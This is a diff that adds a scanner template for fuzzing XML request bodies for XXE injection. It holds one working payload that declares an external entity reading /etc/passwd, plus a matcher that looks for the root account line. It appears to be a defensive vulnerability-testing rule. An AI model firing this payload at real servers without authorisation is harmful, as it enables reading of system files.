@@ -1,0 +1,32 @@
+id: xxe-body-uniq
+
+info:
+  name: XXE 
+  author: reewardius
+  severity: high
+  tags: fuzzing-req,fuzzing-req-xxe,fuzzing-req-body-query,fuzzing-req-body,xxe,dast
+  
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method in ["POST", "PUT", "DELETE", "PATCH"]' # Check for common HTTP methods
+          - 'contains(tolower(content_type), "xml")' # Check if Content-Type is XML
+        condition: and
+    payloads:
+      xxe:
+        - "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>"
+        
+    stop-at-first-match: true
+    fuzzing:
+      - part: body
+        type: replace
+        mode: single
+        fuzz:
+          - "{{xxe}}"
+          
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:x:0:0:" # Common string in /etc/passwd file
